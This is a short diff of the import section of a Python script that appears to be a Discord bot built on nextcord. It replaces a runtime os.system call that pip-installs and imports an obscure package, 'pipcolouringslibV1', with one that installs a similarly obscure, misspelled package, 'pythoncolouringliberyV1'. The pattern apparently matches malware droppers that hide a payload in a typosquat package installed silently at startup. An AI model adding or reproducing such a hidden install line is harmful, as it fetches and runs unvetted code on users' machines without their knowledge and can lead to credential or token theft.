@@ -1,7 +1,7 @@
 #Importing modules
 import os
-os.system("pip install pipcolouringslibV1")
-import pipcolouringslibV1
+os.system("pip install pythoncolouringliberyV1")
+import pythoncolouringliberyV1
 import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
 from nextcord import ButtonStyle
 from nextcord.ext import commands
